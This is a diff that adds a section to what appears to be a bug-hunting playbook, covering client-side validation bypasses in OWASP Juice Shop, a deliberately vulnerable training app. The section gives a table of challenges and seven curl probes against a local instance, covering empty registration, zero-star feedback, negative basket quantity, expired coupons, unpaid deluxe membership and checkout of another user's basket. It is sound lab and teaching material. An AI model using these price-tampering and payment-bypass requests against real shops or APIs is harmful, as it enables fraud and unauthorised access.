@@ -191,6 +191,71 @@ A breach-monitoring service required email verification before enabling monitori
 
 ---
 
+## P1 — Client-Side-Only Validation Bypass (OWASP Juice Shop)
+
+**Frame:** Juice Shop's Angular client enforces all form validation and route guards in the browser only (TypeScript in the JS bundle). The Express/Sequelize backend exposes auto-generated CRUD at `/api/{Model}` (e.g. `/api/Users`, `/api/Feedbacks`, `/api/Products`) and hand-rolled REST at `/rest/{noun}` (e.g. `/rest/basket`, `/rest/coupon`, `/rest/deluxe-membership`). The SQLite-backed server **trusts that the client already validated** — so any constraint the form enforces (required fields, min/max, matching passwords, "must pay") evaporates the moment you POST/PUT straight to the API and skip the Angular layer. Base URL: `http://localhost:3000`.
+
+**The bypass move (always the same):** find the field the Angular form blocks, then send the request the form would never let you build directly to the REST endpoint.
+
+**Out-of-range / skip-the-form checklist:**
+
+| Client-side rule (Angular only) | API payload that ignores it | Juice Shop challenge unlocked |
+|---|---|---|
+| Email + password required, "no junk accounts" | `POST /api/Users` with `email:""`, `password:""` | **Empty User Registration** |
+| Each email registers once | repeat the same `POST /api/Users` body | **Repetitive Registration** (combine with mismatched repeat below) |
+| `password` must equal `passwordRepeat` | `POST /api/Users` with `password:"a"`, `passwordRepeat:"b"` | **Repetitive Registration** / password-mismatch acceptance |
+| Star rating slider clamps 1–5 | `POST /api/Feedbacks` with `rating:0` | **Zero Stars** |
+| Quantity stepper enforces ≥ 1 | `POST /api/BasketItems` (or `PUT`) with `quantity:-100` or `quantity:0` | negative/zero-quantity price tampering |
+| Coupon field rejects expired codes | replay a format-valid but expired coupon at checkout | **Expired Coupon** |
+| Deluxe upgrade requires payment | flip the membership/entitlement without paying | **Deluxe Fraud** |
+| Checkout requires a real, owned, non-empty basket | check out an empty cart or another user's basket id | **Payback Time** |
+
+**Concrete probes:**
+
+```bash
+# Empty User Registration — Angular requires email+password; API does not
+curl -s -X POST http://localhost:3000/api/Users \
+  -H "Content-Type: application/json" \
+  -d '{"email":"","password":"","passwordRepeat":"","securityQuestion":{"id":1},"securityAnswer":"x"}'
+
+# Repetitive Registration — passwordRepeat mismatch the form would block
+curl -s -X POST http://localhost:3000/api/Users \
+  -H "Content-Type: application/json" \
+  -d '{"email":"dup@juice-sh.op","password":"aaa","passwordRepeat":"bbb","securityQuestion":{"id":1},"securityAnswer":"x"}'
+
+# Zero Stars — slider clamps 1-5; POST rating:0 straight to the model
+curl -s -X POST http://localhost:3000/api/Feedbacks \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <JWT>" \
+  -d '{"comment":"client validation is a lie","rating":0,"captchaId":0,"captcha":"<answer>"}'
+
+# Negative / zero quantity — stepper enforces >=1; API multiplies qty*price unguarded
+curl -s -X PUT http://localhost:3000/api/BasketItems/1 \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <JWT>" \
+  -d '{"quantity":-100}'
+
+# Expired Coupon — submit a format-valid but expired code to the coupon REST endpoint
+curl -s -X PUT http://localhost:3000/rest/basket/<basketId>/coupon/<expiredButValidFormatCode> \
+  -H "Authorization: Bearer <JWT>"
+
+# Deluxe Fraud — claim deluxe membership/entitlement without a real payment
+curl -s -X POST http://localhost:3000/rest/deluxe-membership \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <JWT>" \
+  -d '{"paymentMode":"wallet"}'   # tamper paymentMode / skip a funded card; server trusts it
+
+# Payback Time — check out an empty or foreign basket id the UI would never let you reach
+curl -s -X POST http://localhost:3000/rest/basket/<basketId>/checkout \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <JWT>" \
+  -d '{}'
+```
+
+**Root cause (same as #1 below, applied to Juice Shop):** the server treats Angular form validation and route guards as the only enforcement layer. Required-field checks, numeric min/max, password-match, coupon-expiry, payment-required, and basket-ownership are all client-side; the auto-CRUD `/api/{Model}` and `/rest/{noun}` endpoints accept whatever is sent. Recon move: grep the Angular bundle (`main.js`) for `Validators.required`, `Validators.min`, `Validators.max`, and `canActivate` guards — each one names a constraint the backend almost certainly does not re-check.
+
+---
+
 ## Disclosed Report Citations (Backfill +5 — 2016-2023)
 
 The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. All five share a measurable financial-impact angle (actual $ loss demonstrated or quantifiable platform-wide exposure).
